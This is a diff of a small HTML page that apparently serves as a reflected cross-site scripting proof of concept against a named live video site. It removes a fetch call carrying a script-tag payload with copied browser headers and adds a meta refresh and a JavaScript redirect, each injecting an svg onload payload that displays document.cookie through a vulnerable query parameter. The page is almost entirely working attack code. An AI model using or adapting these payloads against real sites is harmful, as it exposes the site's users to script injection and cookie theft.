@@ -2,41 +2,12 @@
 <html>
 <head>
     <title>Loading...</title>
+    <meta http-equiv="refresh" content="0;url=https://video.fc2.com/a/list_catlist_thumb?osqdl=%22%3E%3Csvg/onload=alert(document.cookie)%3Eszy6o=1">
 </head>
 <body>
-    <h1>Please wait...</h1>
+    <h1>Redirecting...</h1>
     <script>
-        // Create exact request matching Burp headers
-        fetch('https://video.fc2.com/a/list_catlist_thumb?osqdl"><script>alert(document.cookie)</script>szy6o=1', {
-            method: 'GET',
-            credentials: 'include',
-            headers: {
-                'Cache-Control': 'max-age=0',
-                'Sec-CH-UA': '"Google Chrome";v="141", "Not=A?Brand";v="8", "Chromium";v="141"',
-                'Sec-CH-UA-Mobile': '?0',
-                'Sec-CH-UA-Platform': '"macOS"',
-                'Accept-Language': 'en-US;q=0.9,en;q=0.8',
-                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-User': '?1',
-                'Sec-Fetch-Dest': 'document',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Upgrade-Insecure-Requests': '1'
-            }
-        })
-        .then(response => response.text())
-        .then(html => {
-            document.open();
-            document.write(html);
-            document.close();
-        })
-        .catch(error => {
-            console.log('CORS Error - trying alternative method');
-            // Fallback to redirect if fetch fails
-            window.location = 'https://video.fc2.com/a/list_catlist_thumb?osqdl="><svg/onload=alert(document.cookie)>szy6o=1';
-        });
+        window.location = 'https://video.fc2.com/a/list_catlist_thumb?osqdl="><svg/onload=alert(document.cookie)>szy6o=1';
     </script>
 </body>
 </html>
